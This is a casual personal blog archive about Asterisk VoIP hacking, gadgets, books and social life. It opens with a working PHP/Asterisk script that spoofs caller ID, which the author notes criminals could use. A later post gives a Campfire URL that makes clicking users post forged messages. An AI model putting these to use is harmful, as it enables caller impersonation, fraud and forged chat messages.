&lt;blockquote&gt;&lt;small&gt;&lt;span style=&quot;font-style: italic&quot;&gt;//(step 1) Prompt user for input&lt;/span&gt;
$agi-&amp;gt;stream_file(&apos;enter_spoof&apos;); &lt;span style=&quot;font-style: italic&quot;&gt;//(step 2) Grab 10 digits&lt;/span&gt;
$result = $agi-&amp;gt;get_data(&apos;beep&apos;, 3000, 10);
&lt;span style=&quot;font-style: italic&quot;&gt;//set variables and output debug info&lt;/span&gt;
$spoofnumber= $result[&apos;result&apos;];
$agi-&amp;gt;verbose(&quot;Spoof Number:&quot;.$spoofnumber);&lt;/small&gt;</pre></p>
<small><span style='font-style: italic'>//(step 3) Prompt user for input</span>
$agi-&gt;stream_file('call_spoof');
<span style='font-style: italic'>//(step 4) Grab 10 digits</span>
$result = $agi-&gt;get_data('beep', 3000, 10);
<span style='font-style: italic'>//set variables and output debug info</span>
$callnumber= $result['result'];
$agi-&gt;verbose("Number to call:".$callnumber);

<span style='font-style: italic'>//(step 5) Set callerid to whatever the input was in step 2</span>
$agi-&gt;set_callerid($spoofnumber);
<span style='font-style: italic'>//(step 6) Make call to number from input in step 3 and 4
$agi-&gt;exec("Dial IAX2/yourpassword@provider/1".$callnumber);
</span>

</small>
<p>The agi interface to asterisk obviously hides a lot of the complex stuff that asterisk does in the background - but still - the code is insanely simple. even with user interaction. A lot of features could be added - password; callerid checking to make sure only valid users are using the app; call back - so if you call it and set up your spoof, it calls back your number to make sure you who you say you are. or whatever ;) a lot of options are available. With a little bit of expansion - i think someone could easily make a robust callerid spoofing application for criminals and not criminals. it is easy enough for anyone to do.</p>

                <p>seirously. i just lay in bed. feeling sick. breathing out of my mouth and bummed that i can&#8217;t sleep.</p>

<p>so i thought up a couple interesting ideas that i would like to take up in the next couple months. First - a set of discrete devices that are connected via a bluetooth PAN. like a small network of ambient devices: a glowing orb, a dial, &#8220;agent,&#8221; a couple small black boxes to integrate with stereo&#8217;s or video signals and of course a way to integrate with cell phones. I think the set shoudl have a master box that detects when a cell phone is in range and alerts the user. yea know that stuff. fun things. all varying shades of ambientness.</p>

<p>the next thign i keep thinking about is using xmpp and tidywiki to create a personal wiki that uses gmail for storage. it would be perfect and really simple. i think i could do it. i am going to try and do it tomorrow. unless i sleep through tomorrow. then i am going to try and get better.</p>

<p>ehhh. i hate sick.</p>

                <p>Awhile ago i picked myself up an ambient orb. It is a really cool idea - basically a device that will let you see information at a glance. For example - seeing how a server is doing based on the orbs color, or seeing what the weather is like based on the color. a lot of options. but the coolest part is that it is not obtrusive to your everyday life. you are able to just look and then see what is happening.</p>

<p>I really like the idea of ambient instrument displays. it fits into the paradighm i want computers to fit in. that sorta philip k. dick type of computer you see in the minority report movie and other future movies. something that is just sitting in a wall to be interacted with. not something that you need to actually sit in front of.</p>

<p>so anyway&#8230; i purchased one awhile back and i didn&#8217;t like how hard it was to interface with. i wrote an <a href='http://dopeman.org/ambient/'>interface to it</a> allowing anyone to change the color of my orb - while it sits next to my bed. I though this was cool - but the orb didn&#8217;t show me enough information. and i really didn&#8217;t see a solution until i saw the <a href='http://www.nabaztag.com/vl/FR/index.jsp'>nabaztag</a>.</p>

<p>The nabaztag is amazing. it is basically a wifi enabled ambient orb that has a couple more ambient options - ears, and sound. this allows the nabaztag to interact a bit more with its enviroment. for instance - showing amount of emails by the cock of its ears, or demonstrating load by color, showing emergency with ear placement. or any other options. with sound it gets a bit more interesting and a bit less ambient. sound is a bit more disruptive than i like - but it would allow a person to have a more intrusive alert set up in case the ambient alert didn&#8217;t interface well.</p>

<p>so i want one of the nabaztag. i actually want a couple. one for work. one for home. one for hiromi. one for dylan and sarah. one for my parents. and then make it so they integrate with one another. what makes the nabaztag so much better than the ambient orb is that it is wifi. i do worry that it is &#8220;locked&#8221; to the nabaztag servers and isn&#8217;t able to be integrated into my webapps as well as i would like. i will probably buy one to find out. but not for awhile.</p>

<p>in the meantime. i am gong to build one. i read an article detailing how to build an <a href='http://students.washington.edu/natetrue/wlcolor/wlcolor.html'>ambient orb out of a pic microprocessor</a> and a bundle of leds. Using that article and combining it with my new love of embedded linux computers, i will build a embbeded linux box that will control a bunch of leds, a couple other things via motors and have a speaker and audio. I don&#8217;t think it should be very hard. I have been looking into the <a href='http://gumstix.com/'>gumstix platform</a> - with the <a href='http://gumstix.com/spexExpnsion.html'>cfstix </a>and the audio piece. using the cf portion to connect to wifi and then the GPIO on either the audio or the serial port on the tweener board. The idea would be that the little box would integrate with a web app that would stream data to it. or it would integrate with an RSS feed to generate action. i figure the action would be color shifts, motor action or simple audio. nothing to complicated.</p>

<p>The price ceiling would be 300. i really want to use a qee doll for the item. but i doubt they are translucent enough.</p>

<p>i will be sure and update yall.</p>

                <p>Whew.</p>

<p>I have this secret plan to start blogging more regularly and to up the level of intelligence that go into the posts. I am trying to diminish the amount of &#8220;so. i went to a club and then i went to another club and there were people&#8221; posts - instead having &#8220;so. i went to a club and there were these people and they do interesting things like&#8230;.&#8221; and then post more often and more about technology. like how to solve problems that i have solved recently and all that nonsense. i imagine i will do something like that&#8230; soon. i just get home from work and don&#8217;t want to post - or are at work and am busy. like i tell all my friends who are starting blogs (especially the ones who are attempting to make money at it): you should schedule a time and then collect your thoughts for your blogging time. then the posts are more thought out and possibly more interesting to read.</p>

<p>So what HAS been going on with me lately. Well: <ul>
	<li>i widened my blog. i thought it might be helpful to make the thing more readable.</li>
	<li>mark and i redid <a href='http://howtoyoyo.com'>howtoyoyo.com</a>. we redid it in a whole new style. concentrating more on the online media. we have like 400mb of videos that we are hosting. it is turning out really well.</li>
	<li>i worked with VI on this cool project called <a href='http://www.yellowikis.us'>yellowikis.us</a>. i need to wrap it up. but we have been so busy it is stagnent.</li>
	<li>i learned voip really well. i hacked together a system to allow my foreign friends to call the us cheaply using a computer. I also made a tokyo number ring my cell phone. i have been programming dynamic dial plans in php for fun. it rules. i should release my software. i need to finish up my asterisk manager implementation.</li>
	<li>and i have been working a lot</li>
</ul> I can always tell when work is ruling - cuz i don&#8217;t post, i don&#8217;t complain about it and i think about it in the shower, while sleeping, on the bus.. etc. Lately i have been coding some <a href='http://www.extratasty.com/mobile/'>really cool stuff</a>. mostly relating to our shortcode(TASTY) and the logic that is going into the transactions for that. I wrote some really cool pieces that parse out messages into parts, make sure we don&#8217;t flood a cell phone, determine what the user wants and does some simple lowest cost routing for SMS messages. heh. oh&#8230; telecom. how i love thee.</p>

<p>Another cool thing going on at work is our underground sale. <a href='http://jakenickell.com/entry/1114'>Jake had this idea for a sale</a> on <a href='http://www.threadless.com'>threadless</a> that we didn&#8217;t advertise anywhere but a few very specific people. So we all decided on some good people to invite into our experiment and we gave them each a coupon. and then we have a graph that tracks how they are doing. if you would like to participate in the sale - just use: <strong>tenbucks87</strong> and buy 3 or more shirts. you will get them for 10 each. w00t. <a href='http://www.threadless.com'>threadless</a>!!!</p>

<p>Jake also had suggested to me that i integrate my threadless pictures more into my blog. Since i upload so many with my fancy <a href='http://www.google.com/url?sa=t&ct=res&cd=1&url=http%3A//press.nokia.com/PR/200504/991482_5.html&ei=K-jqQ-rZF6KOowKf8o22Bg&sig2=JUjFVQeLE97-jBH9ovMlYw'>N70</a> and <a href='http://www.shozu.com'>shozu</a> it is easy for me to have a &#8220;moblog&#8221; and the recent photos section doesn&#8217;t really cut it. i really like how <a href='http://jakenickell.com'>jake does it</a> and it really hits home in regards what i think is cool right now. i am really into blogs turning into aggregate views of ones online persona. i don&#8217;t want to just see what someone has to say. i want to see where they are, what <a href='http://www.flickr.com'>pictures they have taken</a> and what links they are <a href='http://www.del.icio.us'>clicking to</a>. i would also love to see what they are buying, what they are watching and what they are reading - <a href='http://www.musicblogger.org'>let alone what they are listening to</a>.</p>

<p>in mid march i am going to tokyo to visit <a href='http://www.hirominakazawa.com'>hiromi</a>. i am quite excited. i miss her quite a bit and it will be nice to see her place and what not. i am also excited to be in tokyo. my dream is to somehow become a pop star while i am there. i have this theory that if i just run around - it is bound to happen. heh.</p>

<p>i am going to go get my super dry laundry and then goto bed. i just finished <a href='http://destroytechnology.com/dark-1000-0765308851-Tatja_Grimms_World'>tatja grimm</a> - the new <a href='http://destroytechnology.com/d3-Vernor_Vinge'>vernor vinge book</a>. it was really good. i didn&#8217;t like it at first. but it grew on me. now i am going to read something less cool. hah.</p>

<p>Oh yea. <a href='http://campfirenow.com'>campfire </a>is sweet. the <a href='http://www.37signals.com'>37signals </a>guys did a great job. although i am a bit worried about how you can spoof the message post url in a tinurl and make anyone who clicks on it say whatever you want them to say ;) but that is naturally a weakness in a webchat.. especially with ajax.</p>

<p>here is the speak url;</p>

<p>/room/44/speak?message=message+here</p>

<p>if someone goes to that while in room 44 they will say &#8220;message here&#8221;</p>

                <p>So yesterday i got up rather late ~ like 3pm. That isn&#8217;t really unusual. I usually get up quite late on saturdays. I was thinking that i have maybe not &#8220;wasted&#8221; a saturday to sleep 50 times in the last 5 years. I enjoy it. i feel that it is some of the only time i have JUST to myself. sleep. hah. and i am always in a constant state of sleep dep - that it is helpful. Anyway&#8230; I slept late yesterday and decided to read a bit in my book. I was reading the last book of the Hyperion series by <a href='http://destroytechnology.com/d4-Dan_Simmons'>Dan Simmons</a>. I hadn&#8217;t read much of it and so i really wanted to get a chunk of it done. I was on like page 80 or something. So i finished it. hah. i didn&#8217;t mean to. i just suddenly noticed that i was on page 550 of 700. It was a fine ending. I was happy with the series. So anyway. my plan of getting down to some work was blown by nutso scifi. w00t. The best was after i finished the book at 1am, i did a bit of computer work - then went to bed. And read myself to sleep with my <a href='http://destroytechnology.com/home?k=tatja+grimm&c=dark'>new Vernor Vinge book</a>. hah. I rule. Although i shouldn&#8217;t be reading the Vinge book yet. i should be finishing that lame book &#8221;<a href='http://destroytechnology.com/home?k=Gridlinked&c=dark'>Gridlinked</a>&#8221; and moving on to my <a href='http://destroytechnology.com/dark-1000-055357339X-Assassins_Apprentice_The_Farseer_Trilogy_Book_1'>Assissins Apprentice</a> books that matiss got me into. they rule. like zombie fantasy. and i hate both zombies and fantasy. hah. umm. yea. So now I need to scramble to finish some work. so i can go back to reading.</p>

                <p>i was recently reminded of why i hate companies who are way too full of themselves. just in the past week i called a <a href='http://vibesmedia.com/'>company here in chicago</a> that does some stuff that we were interested in using. they totally blew me off when they realized i wasn't going to use their managed services. wtf. we would have droppped a lot of money on them. we could easily have rivaled what any of their other clients were doing. they thought i was just some punk kid calling to waste time. I hate being snubbed. I will never ever think about using them.</p><p>It just made me realize how important good sales people are in this weird world of the internet. We all hate them. they call. they check up. but when they are awesome. it is so smooth.</p><p>An example of an awesome sales person was when i did work with <a href='http://endeca.com/'>Endeca</a>. Their sales people and sales engineers were so helpful. The engineers understood the product so well that they were immediately able to help us and smooth things over. one of the helpful things was that the relationship didn't end when we purchased their project. They kept checking up on us - both to try and sell and seemingly to try and make our solutions better. It was awesome. they get an A.</p><p>Vibes. you get an F.</p><p>BAM SUCKA!

                <p>As yall know i have been playing and hacking with the Asterisk open source PBX. In my exploration time i have been looking at some great sites on asterisk and came across this relaly great asterisk guy named benjk. He runs the <a href='http://www.sunrise-tel.com/'>sunrise-tel.com</a> site that releases and maintains some OSX Asterisk packages. Quite amazing. The work they are doing is pushing Asterisk into a completely different market than some of the other asterisk distributions. The idea as i see it - is to create a distribution that allows a person to easily install and configure asterisk on simple hardware and use it in a SOHO environment. The ideal place hardware for this would be a macmini or similar hardware, running on OSX. This is a stable unix environment that allows a lot of the hardcore-ness of linux and bsds but puts that carndy coating that is aqua in front of it.</p>

<p>Some of the work benjk and his team have been doing is to attempt to leverage the default hardware that is installed on the Apple boxes as a way to interface with the analog phone system. Either plugging directly into the PSTN or into a phone to act as an extension. This woudl give a SOHO the ability to find inexpensive hardware that works seamlessly with their current phone infrastructure - but allows them all of the features of an advanced PBX. pretty cool stuff.</p>

<p>The update released on the 18th covers quite a few areas:</p>

<p>First off, it covers and solves the issue that was raised about DIGIUM&#8217;s following of the GPL. The update makes <a href='http://www.voip-info.org/wiki/view/Asterisk+GPL+Compliance'>Asterisk compliant with the GPL</a>. There was a concern that DIGIUM use of none GPPL code in their release. One of the problems was a lack of attribution to the authors of plugins, modules and other pieces of code that are not Asterisk proper. This allows all of the contirbutors of all the different pieces to be given proper attirbution. THe update also removed the editline library and uses the OSX API instead. Also, in response to DIGIUM&#8217;s DRM being rejected by the FSF, the DRM was removed as well. The update also bundles some new features into the OSX build. The addition I am most excited about is Bonjour support. Bonjour is Apple&#8217;s service discovery API. It allows pieces of whaterver to discover services of whatever. It is what powers itunes sharing, some chat stuff in ichat and other services in OSX. what makes it cool in regards to Asterisk is that it could allow a wifi phone to autoconfigure itself when it came in contact with an asterisk PBX. There are quite a few exciting implementations that require bonjour - so this is real cool.</p>

<p>Check out the <a href='http://www.sunrise-tel.com/downloads/AsteriskUpdate-2006-01-18-ReadMe.pdf'>update pdf</a> or go ahead and <a href='http://www.sunrise-tel.com/'>download and play</a> with the new version.</p>

<p>Stay tuned for some more posts about asterisk. I am working on two right now - How to hsck asterisk into giving you free pstn -&gt; softphone. and How to spoof caller id using php and asterisk.</p>

                <p>so i sit in front of my TV and listen to music or watch old movies while i code. It is probably killer on my back and such - but it makes coding a lot less lonely and i get a lot done. But tonight it was really bad. My airport express was being a bitch and their was shit on tv - so i ended up watching VH1. MAN. i love crappy music. And amidst my awesome tv experience i kept taking pictures of the videos i liked with my phone.</p>

<p>there really needs to be a del.icio.us for life. i need to be able to tag that chris isaak video as hot and then watch it again and again.</p>

                <p>I am lost in regards to what to listen to. I need something new. Or old. i don&#8217;t know.</p>
<a href='http://www.bigfootencounters.com/files/mk_davis_pgf.gif'>This</a>
<p>Christmas was cool. Hiromi came over from tokyo around the 19th. We hung out with a bunch of people. She saw a lot of her friends and then we played &#8220;hiromi lives in chicago&#8221; and just did what we woudl have done when she lived here. Then we flew to colorado. But right before that we went to this cool party at metro. The party was really cool - I had hooked up my friends(kill hannah) with my friends(threadless) to sponsor kill hannah&#8217;s event at the metro on the 23rd of dec. So this melding of friends created a really fun event. A lot of cool cats and friends were there. It turned out to be quite a successful event. <a href='http://nata2.org/photos/album/kill-hannah-at-the-metro/'>Here is a set of pictures i took with my fancy camera phone.</a></p>

<p>So anyway - hiromi and i flew to colorado and hung out with my family and what not. It was awesome to see dylan. he arrived at the airport to get us <a href='http://nata2.org/photos/album/christmas-time-2005/page/2/photo/12242005887jpg/'>dressed as a jester</a>. It was awesome. We then all <a href='http://nata2.org/photos/album/christmas-diy-qee-fun/'>decorated qee dolls</a> and then <a href='http://nata2.org/photos/album/christmas-time-2005/page/1/photo/12242005914jpg/'>opening presents</a>. Christmas day was spent hanging out and then going to the kadings for some game playing. I got <a href='http://nata2.org/photos/show/recent/page/1/photo/my-dad-got-me-new-sheets-they-are-really-soft/'>fancy new sheets</a> and a monkey head for xmas. It was fun.</p>

<p>Then we flew back to chicago and hiromi and i went and saw brokeback mountain and got dinner. then she went back to japan. i miss her for sure. brokeback mountain was really good.</p>

<p>Then i went back to work and craziness ensued. Then new years eve. and then now.</p>

<p>On new years eve we again had the party at the kill hannah space. It was pretty awesome. Derek and i once again worked the door. hah. this year it was more structured because we didn&#8217;t want to really have the party get out of control. So we were armed with guestlists and some attitude. It was pretty hilarious.</p>

<p>Since it was guestlist only we had a lot of people who wanted to get in who were not on the guestlist. So we had to convince them to pay a lot of money to get in. it was stupid. they shoudl have bribed us. really 5 sollars would have done it. but they complained soo much. it was derek and my studio 54. it was fun. we had this one guy want to get in that wasn&#8217;t on the list. so he was like &#8220;let me show you my 1300 dollar back piece.&#8221; and derek and i being into tattoos were like. &#8220;YES. show us&#8221; - so he did. it was a really nice piece with a biblical phrase that was jeremiah or something. so i shouted &#8220;does it say &#8216;narnia&#8217;?&#8221; and everyone booed. i felt bad. but it was funny and he got in.</p>

<p>Another punk tried to get me to change a 100 dollar bill. i was like &#8220;hell no&#8221; and he was all pissed and ended up calling me names and yelling at me. The best was how mad he was that i wouldn&#8217;t break his 100. wtf. so anyway. i told him i woudl pay for him to get him out of my face. and then he spat on me. haha. wtf. where do people get off.</p>

<p>We had these one set of dudes who were being assholes and trying to bum rush derek and i, and generally causing a huge problem. They were pests. We had to tell them to leave. and as they were leaving they were like &#8220;we are going to report you to johnny love. we are going to blacklist you. we are going to call liz armstrong. &#8221; so i responded &#8220;remember.. my name is harper and the address is 1389.&#8221; haha. Shortly after this the cops came. I really think that those punks called the police on us. The cops were real real nice. They didn&#8217;t write tickets or take money or anything. they just had everyone leave. we then went to brocks house and had fun. and got sleepy.</p>

<p>so then. on sunday i slept and made cool things. I fixed up <a href='http://flashandburn.net'>flashandburn</a> to be really cool - using ajax to grab the flickr images rather than something lame. I am going to redo <a href='http://watership.org'>watership</a> in the same way when i get a chance. i also made a cool myspace/blog/forum <a href='http://flashandburn.net/flickrtools'>flickr badge</a> that doesn&#8217;t rely on any scripting. check it out <a href='http://flashandburn.net/flickrtools'>here</a>. after that i made a php script to <a href='http://nata2.info/code/backupFlickr/backupFlickr.phps'>backup all my images off the flickr servers</a>. I rule. and i love the flickr api. Busy busy. i am thinking of really rocking the flickrbadge thing to make it quite versatile. I want to have it display all sorts of info. it is all php and pretty cool. i enjoy php.</p>

<p>i really want to upgrade my rails stuff to 1.0 - but i really don&#8217;t want to deal with all the crap upgrading. seriously. wtf is with the upgrading guide. &#8220;backup your code (use svn). do a rails . in your application dir. do a diff to see whats different. debug&#8221; that is bullshit. people should release a LOT of incremental releases to make upgrading easy. it is hard to maintain rails applications.</p>

<p>i need to break up my entries. haha.</p>

                <p>So asterisk is amazing. i have been plating with it quite a bit. I recently hooked it up at skinnyCorp and got it to be there PBX. it is quite amusing to have that much control and granularity with the phone system. I am contemplating rolling out a small scale service based on the asterisk platform. It should be interesting. stay tuned. TUNED I SAY.</p>

<p>Work has been awesome.</p>

<p>Oh yea. Squidoo launched. check it out. here are some of my lenses: <a href='http://www.squidoo.com/awesome/'>Awesome Things</a>, <a href='http://www.squidoo.com/harper/'>Harper</a>, <a href='http://www.squidoo.com/asterisk/'>Asterisk</a>, <a href='http://www.squidoo.com/mobilephone/'>Mobile Phones</a> and soon to have others.</p>

                <p>So i haven&#8217;t updated in awhile. that is.. i haven&#8217;t updated since the beginning of thanksgiving weekend. Oh what a weekend it was. Filled with unimaginable excitment and fun.</p>

<p>On wednesday i arriveed. my mother had made all of us kids (dylan, jon, me, sarah, and my cousins) fur vests. Most of them were wolverine fur, but some were from some fantasy animal. They are awesome. So we donned our fur vests and continued to rule for the weekend. We built a catapult, bought crazy things, dranks lots of beer and pop and generally had a brilliant time. you can chek out the pictures <a href='http://nata2.org/photos/album/reed-family-fantasy-thanksgiving-weekend/'>here</a>. heh. or you can check out our catapult pictures <a href='http://nata2.org/photos/album/reed-family-catapult-action/'>here</a>. fun fun. It was incredible. I had a great time. and i think everyone else did too.</p>

<p>Then i got back. On my way back i read memiors of a geisha. It was really good. Then i read schindlers list. it was also very very good. I like sad books i guess. I am now back to a steven brust book. i am very excited. VERY VERY excited.</p>

<p>I am still uploading hundreds of pictures a minute to flickr with shozo. it is pretty dope.</p>

<p>Tonight i am going to crobar to see hilary clinton. Hopefully i will get some pictures. I want to become illumanati.</p>

<p>Hiormi is coming to visit on the 19th. i am excited.</p>

                <p>Oh man. i am sitting here in midway. about an hour before i have to get on my plane. My internet obviously works - due to me being able to post this, but i am not able to access any of my own websites. websense has blocked them all. haha. stupid &#8220;gray hat.&#8221; haha. as if i actually wore hats. anyway. i just ssh&#8217;d into my server, and am using lync to leave this. hah. we shall see how it actually turns out.</p>

<p>Lately i have been working a lot. playing servers. i am setting up subversino and trac for use over at skinny and i am quite impressed with myself. i am awesome. i rule. haha. oh so awesome.</p>

<p>NOw i am going to colorado - we are going to build a catapult and shoot jon into wyoming. i am pretty thrilled about this. hopefully it will be the best thanksgiving ever. what better way to give thanks to whomever we are supposed to be giving thanks to than by shooting shit and making olden times war machines.</p>

<p>i got a new phone. its a nokia n70. its dope. it cost me an arm and a leg. i really need to get a connection with nokia. the coolest part about the phone - isn&#8217;t even related to the phone. i am using this dope software called <a href='http://www.shozu.com'>shozu</a>. It is basically a handler that attaches to the camera app and when you take a picture it asks if you want to upload it to flickr. then it sets it in its upload queue and uploads it. w00t. so i have placed all my pictures on flickr fast as hell. and the camera is good and fast. much faster than the 6600 or the 7610. i am happy. i was going to wait for the n71 or n80 but i relaly like the n70 and its slick. so there.</p>

<p>sorry about the spelling and formatting issues. i am in lynx. haha</p>

<p>flickr is so slow sometimes.</p>

<p>i am sleepy. i will be going to bed soon. i really want to install linux on my old desktop to be a fileserver and an awesome computer - hosting things like a phone system and the like - but i don&#8217;t have a monitor. heh. i need to find something.</p>

<p>ok. gnight.</p>

                <p>So last nights late night game playing was maybe not the best idea to quell my sickness. but it ruled so much. we came to my work around 7 to play some half life deathmatch and counterstrike: source. and we left around 3:30am - totally inadvertently. we had planned to leave much earlier cuz both matiss and I have to work in the morning. somehow though.. killing those counter terrorists really got us riled up and not interested in sleep. it is so awesome though. i now understand everyone&#8217;s fascination with counterstrike. it rules. so much.</p>

<p>right now though - i feel like hell. just really really tired. i took a ten minute nap. and then i got up - feeling quite a bit better - but still rough. then i decided to check out this <a href='http://mare.ca/'>mare ep</a> i got. O M G. it rules.</p>

<p>i am a huge fan of sludgey metal. i like my metal tough and water themed. hah.</p>

<p>i just cracked my neck and my vision slurred. haha.</p>

<p>ok. i need to concentrate or i will die.</p>

                <p>Sometimes bloggin just doesn&#8217;t seem appealing. It seems like a something that is just pointless if you are not feeling the blogging vibe. So i have waited until i was in the blogging vibe. It had been an amazing couple of days. great things have happened.</p>

<p>btw, <a href='http://imdb.com/title/tt0104797/'>Malcom X</a> is a great movie. I think the book is one of my favorite books in all of my life. it is so good. So amazing. His life is such an inspiration for really anything. It is amazing that some of that stuff happened in the city of which i live now. Quite something.</p>

<p>So lets see.. probably a week ago was when i last really updated my blog. I was probably ranting about hifi equipment or some nonsense. well i need to order the parts and move on to my second version of my mini hifi set. I am pretty excited about it. i like the idea of ultra modular parts - like replacing my sonic impact with something better or something more complicated. It will rule.</p>

<p>This morning i had an awesome dream. I dreamt i was an astronaut in training to go into space. something about either a contest or some lottery-esque way of achieving atronautness. anyway - i was an in astronaut training and it ruled. it was not a dream with much action. it was all about detail. i had to do so much crap to become an astronaut. i don&#8217;t even think i actually went into space - i had to get up and goto work. stupid work - always fucking with me getting into space. stupid space.</p>

<p>So.. last week. i was really poor. and i started keeping a lot better track of my money as of a couple weeks ago. so i have been keeping an eagle eye on every transaction. I started to notice that i have signed up fo a lot of shit and that the key to winning the internet is reoccurring billing. opt-out, reoccurring billing. don&#8217;t ask just bill. that is the true nature of the internet - oh.. and voyeurism. that rules too.</p>

<p>This weekend was crazy crazy busy. I had so many supercharged events that i was never relaxed or calm. On friday - i went out with <a href='http://danielleclock.org'>danielle</a> and kira. We met up with the gaylords at the kill hannah loft and hung out for a bit. I was able to see brian, whom i haven&#8217;t seen in a minute and that was awesome. then went to Y bar and soundbar to see ritchie hawtin. it was pretty dope. i like really HARD techno. nothing better. <a href='http://flickr.com/photos/natatwo/sets/1248900/'>Check my pictures.</a> they rule. it was halloween so their were some pretty crazy people out.</p>

<p>The on saturday i got up - got my tux on and went to scott and beths wedding. <a href='http://flickr.com/photos/natatwo/sets/1249110/'>here are some pictures</a>. It was a beautiful wedding. a lot of fun. it was at the newberry library and it was pretty chill. No religion which rule. religion in weddings is LAME. i decided while standing in the wedding i decided that my wedding is going to be like this: <blockquote>
<small>

<p>awesome. yes. I thought so. So the wedding ruled. and the reception was good. i had veggie food - which was OK. nothing thrilling - but a nice change from the super red meat i have had at ALL the rest of the weddings of my life. Scott and Beth were sooo happy. It ruled. All their family were so happy it was awesome.</p>

<p>Later that night Amjad picked me up and we went to Y bar for a minute - where we saw the <a href='http://flickr.com/photos/natatwo/57707109/in/set-1251062/'>BEST costume ever</a>. It was a WWI soldier in complete WWI get up. It was pretty crazy. So out of place in Y bar. after Y bar we went to crobar where it was hand down the craziest i have seen it. Somehow 1000 young women got a memo on saturday that saturday night was dress as provactively as possible night. It ruled. <a href='http://flickr.com/photos/natatwo/sets/1251062/'>the pictures are scadalous</a>. hehe. The best part was that the camera was almost a community item that night. Amjad took some, the gaylords took some and i took some. heh. yea yea. ;)</p>

<p>Then on sunday i stayed in and made whotheheck.com with jeffrey. heh. i was supposed to goto redno5 and check out Major Tailor - but i missed out. i was upset. but not totally bummed. that site is fun.</p>

<p>On monday, halloween, we had work. and then we all went to crobar for the <a href='http://flickr.com/photos/natatwo/sets/1264716/'>gaylords halloween party</a>. It ruled so much. I was a black metal rocker. I had a trident. and i looked awesome. heh. i was wearing my <a href='http://flickr.com/photos/natatwo/58454393/in/set-1264716/'>CRAZY 6-8inch platforms with skulls and spikes</a> attached to them. <a href='http://flickr.com/photos/natatwo/58454952/in/set-1264716/'>Olivia did my makeup</a> and matiss gave me some clothes. It turned out soooo damn good. i RULED. haha. a <a href='http://static.flickr.com/33/58461533_59aec0528e_s.jpg'>black metal warrior</a> for sure. The most insane part of the night was that my costume was so so extensive that nobody recognized me. Claudia totally didn&#8217;t recognize me and was totally surprised when i showed up. but then after dancing and rocking for a while my feet hurt and i was soooo tired. so i went home. my feet are still screwed up. soon they will feel better. i hope.</p>

<p>The best was that on tuesday i went to bed around 6:00pm and suddenly woke up around 8am. wtf. hah. no break. it was like i blinked. that is insane. i didn&#8217;t even mean to. i meant to take a nap. i even set my alarms for 8pm. but nope. slept until dawn. it felt so good.</p>

<p>so that is pretty much up to now.</p>

<p>i rule. and that is pretty much the bottom line. i need to finish some books and finish this movie. but that will all come later.</p>

<p>oh yea. work is pretty dope. i enjoy it.</p>

<p>Hiromi is coming for christmas. i think she is flying in on the 19th and then leaving on the 29th. i am excited to see her. i am going to have to figure out how this is all going to work. cuz we are having a party on the 23rd - which means we will have to fly out to colorado on the 24th. which is rough. but that is fine. no prob. heh. just a tired christmas eve. stupid jesus.</p>

                <p>So. I have been at work a lot lately.</p>

<p>So my amp mod is pretty dope. Although i get a fierce hum when i charge the battery - i have decided to move forward and build the rest of it. I think i am going to build four distinct parts. First the power supply. i am thinking that the power supply should be completely separate from all of the other components - mostly cuz it is totally noise causing and i will be able to replace it if needed. I do like how clean and portable the battery power is - so i will keep that and then make the trickle charger just charge it always. I would like to place a digital or analog voltage meter on the front to make sure that the voltage is correct and that the battery is charged. I think something real flashy wil be nice. like a simple digital display with a blue LED backlight. It will rule.</p>

<p>The second component will be the preamp/input switch - this will be a simple simple preamp. The tirck will be that the volume pot will be motorized to control the volume via a microcontroller - this will allow me to have a remote. god i need a remote. then i will also add twin VU meters - not real real vu meters, but somethign that will allow me to view the levels for each channel. once again - something kinda flashy. i think that really nice analog VUish meters woudl be nice - with that really dim seventies light. Something simple though.</p>

<p>The third component would be the phono preamp. It would a really chilled out active/passive phono preamp that would allow me to hook my turntable(1200 w00t) to my preamp/amp. that is all.</p>

<p>The fourth and probable most important part of the equation would be the amp. i would take the pot off the amp and make it just be an amp. nothing more. i will possibly use the sonic impact t-amp - but maybe upgrade to something with a bit power so i don&#8217;t have to use crazy crazy speakers for it to soudn good.</p>

<p>A probably pseudo parts list: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

<p>I think that this project rules and is totally teaching me more about electronics. i mean - i took the classes and have done shit with microcontrollers - but i like this application crap. it rules.</p>

<p>so there.</p>

                <p>Tonight ruled. while waiting for the <a href='http://www.yayhooray.com/thread/60504/skinnyCorp-gets-fancied-up-LIVE'>graffiti artist to work and finish</a> and such i decided to do my t-amp project. i got all the rest of my parts i ordered to rebox the sonic impact t-amp. i followed the directions and parts lists from <a href='http://members.tripod.com/talkgarden/sonic_impact_5066.htm'>this awesome site</a>. it was quite quite helpful. I have found a <a href='http://del.icio.us/nata2/t-amp'>LOT of sites</a> dealing with the t-amp and that one is quite possibly the most complete. It has parts lists, schematics and lots of pictures. it is well written and is enjoyable.</p>

<p>So i got the parts.. well i got almost all of them, i didn&#8217;t have the patience to wait for the radio shack ones - so i just ran there and purchased them. i am needing one more toggle switch to be completely complete - but it is straight.</p>

<p>here are my pictures in poor poor order: <a href='http://www.nata2.org/photolog/?i=0&image=0&dn=201020050138&fn=Nokia7610(583).jpg'>the front and the battery</a>, <a href='http://www.nata2.org/photolog/?i=0&image=0&dn=201020050504&fn=Nokia7610(588).jpg'>the front and the back placed in the enclosure</a>, <a href='http://www.nata2.org/photolog/?i=0&image=0&dn=201020050504&fn=Nokia7610(589).jpg'> the t-amp placed in the enclosure with the 12V battery (eep, messy)</a>, <a href='http://www.nata2.org/photolog/?i=0&image=0&dn=201020050504&fn=Nokia7610(591).jpg'>front with the top on</a>, and finally <a href='http://www.nata2.org/photolog/?i=0&image=0&dn=201020050504&fn=Nokia7610(592).jpg'>the back</a>. It sounds pretty good. i trust this POT a lot more than i did the crappy one that was on the original case. i also like having a real on off switch. and the battery should be dope. oh and the actual speaker wire terminals are gunna rock. i can&#8217;t wait to take it home. I am thinking that i will probably redo it when i get my two others. one will remain stock and one i will place in a really nice wooden chassis with the same basic components - but really well done (maybe i will make two and give one to my dad). The goal is to have four matching boxes - a preamp/input selector, and amp, a phono preamp and a DAC.</p>

<p>it is still late. we are working until 10am. then home to sleep until late. Today we had all our beds and rooms cleaned and the whole apartment sprayed with toxic chemicals to stop evil bugs from invading our skin. it is good. the exterminator didn&#8217;t find anything - that is also good.</p>

<p>i think i will be really screwed up after this week. and i am going to goddamned iowa this weekend for goddamned broox&#8217;s wedding. i am happy for him but wtf is he doing in iowa. it so far from ME! hahaha</p>

<p>and then next weekend is goddamn scott&#8217;s wedding. stupid married people and their love..</p>

